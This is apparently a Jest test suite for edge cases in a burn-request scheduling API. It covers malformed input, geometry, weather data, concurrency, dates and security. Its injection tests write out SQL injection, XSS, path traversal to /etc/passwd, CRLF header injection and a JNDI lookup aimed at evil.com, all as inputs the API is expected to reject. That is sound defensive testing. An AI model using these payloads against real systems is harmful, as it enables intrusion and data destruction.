/**
 * BURNWISE Edge Case Testing Suite
 * 
 * Comprehensive testing of edge cases, boundary conditions, and error scenarios
 * that could cause system failures in production environments.
 */

const request = require('supertest');
const { initializeDatabase, query, getConnection, closePool } = require('../db/connection');
const BurnRequestCoordinator = require('../agents/coordinatorFixed5Agent');

describe('Edge Case Testing Suite', () => {
  let app;
  let coordinator;

  beforeAll(async () => {
    // Initialize test environment
    process.env.NODE_ENV = 'test';
    await initializeDatabase();
    coordinator = new BurnRequestCoordinator();
    
    // Start test server
    const server = require('../server');
    app = server.app || server; // Handle different export formats
  });

  afterAll(async () => {
    if (closePool) await closePool();
  });

  describe('API Input Validation Edge Cases', () => {
    
    test('should handle malformed JSON gracefully', async () => {
      const malformedRequests = [
        '{"farmId": 1, "fieldGeometry": {malformed json}',
        '{"farmId": "not_a_number"}',
        '{broken: json, without: quotes}',
        '',
        'null',
        'undefined',
        '[]', // array instead of object
        '{"fieldGeometry": {"type": "Polygon", "coordinates": [[[null,null]]]}}' // null coordinates
      ];

      for (const malformedJson of malformedRequests) {
        const response = await request(app)
          .post('/api/burn-requests')
          .set('Content-Type', 'application/json')
          .send(malformedJson);

        // Should return 400 Bad Request, not crash
        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('should handle extremely large payloads', async () => {
      // Create a payload with massive coordinates array
      const massiveCoordinates = [];
      for (let i = 0; i < 10000; i++) {
        massiveCoordinates.push([-120 + Math.random(), 40 + Math.random()]);
      }
      
      const massivePayload = {
        farmId: 1,
        fieldGeometry: {
          type: 'Polygon',
          coordinates: [massiveCoordinates]
        },
        requestedDate: '2025-08-15',
        requestedStartTime: '09:00',
        requestedEndTime: '15:00'
      };

      const response = await request(app)
        .post('/api/burn-requests')
        .send(massivePayload);

      // Should either process or reject gracefully, not crash
      expect([200, 201, 400, 413, 422]).toContain(response.status);
    });

    test('should handle injection attempts', async () => {
      const injectionPayloads = [
        {
          farmId: "1'; DROP TABLE burns; --",
          purpose: "<script>alert('xss')</script>",
          fieldGeometry: { type: "'; SELECT * FROM users; --" }
        },
        {
          farmId: 1,
          requestedDate: "2025-08-15'; DELETE FROM farms; --",
          purpose: "../../etc/passwd"
        },
        {
          farmId: 1,
          fieldGeometry: {
            type: "Polygon",
            coordinates: [[["${jndi:ldap://evil.com/a}", 40]]]
          }
        }
      ];

      for (const payload of injectionPayloads) {
        const response = await request(app)
          .post('/api/burn-requests')
          .send(payload);

        // Should validate and reject malicious input
        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('should handle Unicode and special characters', async () => {
      const unicodePayload = {
        farmId: 1,
        purpose: '🔥 Agricultural burn with émojis and spéciał chäräctërs 中文 العربية',
        fieldGeometry: {
          type: 'Polygon',
          coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
        },
        requestedDate: '2025-08-15',
        requestedStartTime: '09:00',
        requestedEndTime: '15:00',
        notes: '∞ ± ≤ ≥ ° ™ © ® ÷ × ∑ √ ∂ ∆ π Ω μ σ λ Ψ Φ ∴ ∀ ∃'
      };

      const response = await request(app)
        .post('/api/burn-requests')
        .send(unicodePayload);

      // Should handle Unicode gracefully
      expect([200, 201, 400, 422]).toContain(response.status);
    });
  });

  describe('Database Connection Edge Cases', () => {
    
    test('should handle database connection interruption gracefully', async () => {
      // Simulate connection issues by creating many concurrent requests
      const concurrentRequests = Array.from({ length: 100 }, (_, i) => 
        query('SELECT 1 as test_connection', [])
          .catch(err => ({ error: err.message }))
      );

      const results = await Promise.allSettled(concurrentRequests);
      
      // Some may fail due to connection limits, but shouldn't crash
      const succeeded = results.filter(r => r.status === 'fulfilled' && !r.value.error).length;
      const failed = results.filter(r => r.status === 'rejected' || r.value?.error).length;
      
      expect(succeeded + failed).toBe(100);
      expect(succeeded).toBeGreaterThan(0); // At least some should succeed
    });

    test('should handle malformed SQL parameter edge cases', async () => {
      const malformedQueries = [
        { sql: 'SELECT ? as test', params: [undefined] },
        { sql: 'SELECT ? as test', params: [null] },
        { sql: 'SELECT ? as test', params: [NaN] },
        { sql: 'SELECT ? as test', params: [Infinity] },
        { sql: 'SELECT ? as test', params: [{}] },
        { sql: 'SELECT ? as test', params: [[]] },
        { sql: 'SELECT ? as test', params: [Buffer.from('test')] }
      ];

      for (const { sql, params } of malformedQueries) {
        try {
          await query(sql, params);
        } catch (error) {
          // Should throw controlled error, not crash process
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toBeDefined();
        }
      }
    });

    test('should handle database timeout scenarios', async () => {
      // Create a query that might timeout
      const slowQuery = `
        SELECT COUNT(*) as count 
        FROM (
          SELECT SLEEP(0.1) as delay 
          FROM farms f1 
          CROSS JOIN farms f2 
          LIMIT 1000
        ) as slow_subquery
      `;

      try {
        const result = await Promise.race([
          query(slowQuery, []),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Test timeout')), 5000)
          )
        ]);
        
        // If it completes, should return valid result
        expect(result).toBeDefined();
      } catch (error) {
        // Should handle timeout gracefully
        expect(error.message).toMatch(/(timeout|Test timeout)/i);
      }
    });
  });

  describe('Geometric Data Edge Cases', () => {
    
    test('should handle invalid polygon geometries', async () => {
      const invalidGeometries = [
        // Self-intersecting polygon
        {
          type: 'Polygon',
          coordinates: [[[-120, 40], [-119, 40], [-120, 41], [-119, 41], [-120, 40]]]
        },
        // Polygon with too few points
        {
          type: 'Polygon', 
          coordinates: [[[-120, 40], [-119, 40]]]
        },
        // Unclosed polygon
        {
          type: 'Polygon',
          coordinates: [[[-120, 40], [-119, 40], [-119, 41], [-120, 41]]]
        },
        // Polygon with holes
        {
          type: 'Polygon',
          coordinates: [
            [[-120, 40], [-119, 40], [-119, 41], [-120, 41], [-120, 40]], // outer
            [[-119.5, 40.2], [-119.3, 40.2], [-119.3, 40.4], [-119.5, 40.4], [-119.5, 40.2]] // hole
          ]
        },
        // Invalid coordinate values
        {
          type: 'Polygon',
          coordinates: [[[NaN, 40], [-119, Infinity], [-119, 41], [-120, 41], [null, undefined]]]
        }
      ];

      for (const geometry of invalidGeometries) {
        const validation = coordinator.validateFieldGeometry(geometry);
        
        if (!validation.isValid) {
          expect(validation.error).toBeDefined();
          expect(typeof validation.error).toBe('string');
        }
      }
    });

    test('should handle extreme coordinate values', async () => {
      const extremeCoordinates = [
        // Beyond Earth bounds
        { coordinates: [[[200, 100], [201, 100], [201, 101], [200, 101], [200, 100]]] },
        // Very precise coordinates
        { coordinates: [[[
          -120.123456789012345, 
          40.987654321098765
        ], [
          -120.123456789012344, 
          40.987654321098765
        ], [
          -120.123456789012344, 
          40.987654321098766
        ], [
          -120.123456789012345, 
          40.987654321098766
        ], [
          -120.123456789012345, 
          40.987654321098765
        ]]] },
        // Microscopic areas
        { coordinates: [[[
          -120.000000000000001, 
          40.000000000000001
        ], [
          -120.000000000000002, 
          40.000000000000001
        ], [
          -120.000000000000002, 
          40.000000000000002
        ], [
          -120.000000000000001, 
          40.000000000000002
        ], [
          -120.000000000000001, 
          40.000000000000001
        ]]] }
      ];

      extremeCoordinates.forEach((coords, index) => {
        const geometry = { type: 'Polygon', ...coords };
        const validation = coordinator.validateFieldGeometry(geometry);
        
        // Should either validate or reject gracefully
        expect(validation).toHaveProperty('isValid');
        expect(typeof validation.isValid).toBe('boolean');
      });
    });
  });

  describe('Weather Data Edge Cases', () => {
    
    test('should handle corrupted weather API responses', async () => {
      const corruptedWeatherData = [
        null,
        undefined,
        {},
        { main: null },
        { main: { temp: 'not_a_number' } },
        { main: { temp: Infinity, humidity: -50 } },
        { wind: { speed: NaN, deg: 720 } },
        { weather: [] }, // empty weather array
        { weather: [{ id: null, main: '', description: null }] },
        { coord: { lat: 'invalid', lon: 'invalid' } }
      ];

      const weatherAgent = require('../agents/weather');
      const agent = new weatherAgent();

      for (const corruptedData of corruptedWeatherData) {
        try {
          // Should handle corrupted data without crashing
          const embedding = agent.createWeatherEmbedding(corruptedData);
          expect(embedding).toHaveLength(128);
          embedding.forEach(value => {
            expect(value).toBeFinite();
            expect(value).not.toBeNaN();
          });
        } catch (error) {
          // If it throws, should be a controlled error
          expect(error).toBeInstanceOf(Error);
        }
      }
    });

    test('should handle extreme weather scenarios without mathematical errors', async () => {
      const extremeWeatherScenarios = [
        {
          name: 'Absolute zero temperature',
          data: { temperature: -273.15, humidity: 0, windSpeed: 0 }
        },
        {
          name: 'Venus-like conditions',
          data: { temperature: 460, humidity: 100, pressure: 9200000, windSpeed: 100 }
        },
        {
          name: 'Mars-like conditions', 
          data: { temperature: -80, humidity: 0, pressure: 600, windSpeed: 20 }
        },
        {
          name: 'Jupiter storm conditions',
          data: { temperature: -150, windSpeed: 400, pressure: 100000 }
        }
      ];

      const weatherAgent = require('../agents/weather');
      const agent = new weatherAgent();

      extremeWeatherScenarios.forEach(({ name, data }) => {
        const embedding = agent.createWeatherEmbedding(data);
        
        expect(embedding).toHaveLength(128);
        embedding.forEach((value, index) => {
          expect(value).toBeFinite();
          expect(value).not.toBeNaN();
        }, `${name} failed at embedding index ${index}`);
      });
    });
  });

  describe('Concurrency and Race Condition Edge Cases', () => {
    
    test('should handle simultaneous burn requests for same field', async () => {
      const simultaneousRequests = Array.from({ length: 10 }, (_, i) => ({
        farmId: 1,
        fieldId: 1, // Same field for all
        fieldGeometry: {
          type: 'Polygon',
          coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
        },
        requestedDate: '2025-08-15',
        requestedStartTime: '09:00',
        requestedEndTime: '15:00',
        purpose: `Concurrent test ${i}`
      }));

      const responses = await Promise.allSettled(
        simultaneousRequests.map(req => 
          request(app)
            .post('/api/burn-requests')
            .send(req)
        )
      );

      // All should complete without crashing
      expect(responses).toHaveLength(10);
      
      // At least some should succeed
      const succeeded = responses.filter(r => 
        r.status === 'fulfilled' && [200, 201].includes(r.value.status)
      ).length;
      
      expect(succeeded).toBeGreaterThan(0);
    });

    test('should handle rapid-fire API requests', async () => {
      const rapidRequests = Array.from({ length: 50 }, (_, i) => 
        request(app)
          .get('/health')
          .timeout(10000)
      );

      const startTime = Date.now();
      const responses = await Promise.allSettled(rapidRequests);
      const endTime = Date.now();

      // Should complete within reasonable time (10 seconds)
      expect(endTime - startTime).toBeLessThan(10000);
      
      // Most should succeed
      const succeeded = responses.filter(r => 
        r.status === 'fulfilled' && r.value.status === 200
      ).length;
      
      expect(succeeded).toBeGreaterThan(rapidRequests.length * 0.8); // 80% success rate
    });
  });

  describe('Memory and Resource Edge Cases', () => {
    
    test('should handle memory pressure scenarios', async () => {
      const initialMemory = process.memoryUsage();
      
      // Create many large objects to pressure memory
      const largeObjects = [];
      for (let i = 0; i < 100; i++) {
        largeObjects.push({
          id: i,
          data: new Array(10000).fill(0).map(() => Math.random()),
          coordinates: new Array(1000).fill(0).map(() => [Math.random() * 360 - 180, Math.random() * 180 - 90])
        });
      }

      // Try to process a burn request under memory pressure
      const response = await request(app)
        .post('/api/burn-requests')
        .send({
          farmId: 1,
          fieldGeometry: {
            type: 'Polygon',
            coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
          },
          requestedDate: '2025-08-15',
          requestedStartTime: '09:00',
          requestedEndTime: '15:00'
        });

      // Should complete without running out of memory
      expect([200, 201, 400, 422, 503]).toContain(response.status);
      
      // Clean up
      largeObjects.length = 0;
      
      if (global.gc) global.gc();
    });

    test('should handle file descriptor exhaustion scenarios', async () => {
      // This test simulates what happens when the system runs out of file descriptors
      // by creating many database connections
      const connections = [];
      
      try {
        // Try to exhaust connection pool
        for (let i = 0; i < 60; i++) { // More than pool limit
          connections.push(getConnection().catch(err => ({ error: err.message })));
        }

        const results = await Promise.allSettled(connections);
        
        // Some should succeed, some should fail gracefully
        const successful = results.filter(r => 
          r.status === 'fulfilled' && !r.value.error
        ).length;
        
        const failed = results.filter(r => 
          r.status === 'rejected' || r.value?.error
        ).length;

        expect(successful + failed).toBe(60);
        expect(successful).toBeLessThan(60); // Pool limit should prevent all from succeeding
        
      } finally {
        // Clean up connections
        for (const connPromise of connections) {
          try {
            const conn = await connPromise;
            if (conn && typeof conn.release === 'function') {
              conn.release();
            }
          } catch (e) {
            // Ignore cleanup errors
          }
        }
      }
    });
  });

  describe('Time and Date Edge Cases', () => {
    
    test('should handle various date format edge cases', async () => {
      const dateEdgeCases = [
        '2025-02-29', // Non-leap year Feb 29
        '2024-02-29', // Leap year Feb 29  
        '2025-13-01', // Invalid month
        '2025-01-32', // Invalid day
        '2025-00-01', // Zero month
        '2025-01-00', // Zero day
        '1900-01-01', // Very old date
        '2200-12-31', // Far future date
        '2025-12-31T25:00:00', // Invalid hour
        '2025-12-31T23:60:00', // Invalid minute
        '2025-12-31T23:59:60', // Invalid second
        'invalid-date',
        '',
        null,
        undefined
      ];

      for (const dateString of dateEdgeCases) {
        const payload = {
          farmId: 1,
          fieldGeometry: {
            type: 'Polygon',
            coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
          },
          requestedDate: dateString,
          requestedStartTime: '09:00',
          requestedEndTime: '15:00'
        };

        const response = await request(app)
          .post('/api/burn-requests')
          .send(payload);

        // Should validate dates and respond appropriately
        expect([200, 201, 400, 422]).toContain(response.status);
      }
    });

    test('should handle timezone edge cases', async () => {
      const timezoneTests = [
        '2025-08-15T09:00:00Z',           // UTC
        '2025-08-15T09:00:00-08:00',      // Pacific
        '2025-08-15T09:00:00+05:30',      // India
        '2025-08-15T09:00:00-12:00',      // Baker Island
        '2025-08-15T09:00:00+14:00',      // Line Islands
        '2025-08-15T23:59:59.999Z',       // End of day
        '2025-08-15T00:00:00.000Z'        // Start of day
      ];

      for (const timestamp of timezoneTests) {
        const payload = {
          farmId: 1,
          fieldGeometry: {
            type: 'Polygon',
            coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
          },
          requestedDate: timestamp,
          requestedStartTime: '09:00',
          requestedEndTime: '15:00'
        };

        const response = await request(app)
          .post('/api/burn-requests')
          .send(payload);

        // Should handle all timezone formats appropriately
        expect([200, 201, 400, 422]).toContain(response.status);
      }
    });
  });

  describe('Network and External Service Edge Cases', () => {
    
    test('should handle weather API timeout scenarios', async () => {
      // This test would require mocking the weather service to simulate timeouts
      // For now, we test the error handling path
      
      const WeatherAgent = require('../agents/weather');
      const agent = new WeatherAgent();
      
      // Test with coordinates that might cause issues
      const problematicCoordinates = [
        { lat: 0, lon: 0 },           // Null Island
        { lat: 90, lon: 0 },          // North Pole
        { lat: -90, lon: 0 },         // South Pole
        { lat: 0, lon: 180 },         // Date line
        { lat: 0, lon: -180 },        // Date line (other side)
      ];

      for (const { lat, lon } of problematicCoordinates) {
        try {
          const result = await agent.analyzeWeatherForBurn(lat, lon, '2025-08-15');
          
          // If successful, should return valid data
          expect(result).toHaveProperty('weatherData');
          expect(result).toHaveProperty('safetyAssessment');
        } catch (error) {
          // If failed, should be handled gracefully
          expect(error).toBeInstanceOf(Error);
          expect(error.message).toBeDefined();
        }
      }
    });
  });

  describe('Security Edge Cases', () => {
    
    test('should handle various header injection attempts', async () => {
      const maliciousHeaders = {
        'X-Forwarded-For': '127.0.0.1, evil.com',
        'User-Agent': '<script>alert("xss")</script>',
        'Referer': 'javascript:alert("xss")',
        'Origin': 'null',
        'Content-Type': 'application/json; charset=utf-8\r\nX-Injected: evil'
      };

      const response = await request(app)
        .post('/api/burn-requests')
        .set(maliciousHeaders)
        .send({
          farmId: 1,
          fieldGeometry: {
            type: 'Polygon',
            coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
          },
          requestedDate: '2025-08-15'
        });

      // Should process request without being affected by malicious headers
      expect([200, 201, 400, 422]).toContain(response.status);
    });

    test('should handle request size limits', async () => {
      // Create an extremely large request
      const largePayload = {
        farmId: 1,
        purpose: 'x'.repeat(1000000), // 1MB string
        fieldGeometry: {
          type: 'Polygon',
          coordinates: [[[-120, 40], [-119.99, 40], [-119.99, 40.01], [-120, 40.01], [-120, 40]]]
        },
        requestedDate: '2025-08-15'
      };

      const response = await request(app)
        .post('/api/burn-requests')
        .send(largePayload);

      // Should either accept or reject with appropriate status code
      expect([200, 201, 400, 413, 422]).toContain(response.status);
    });
  });
});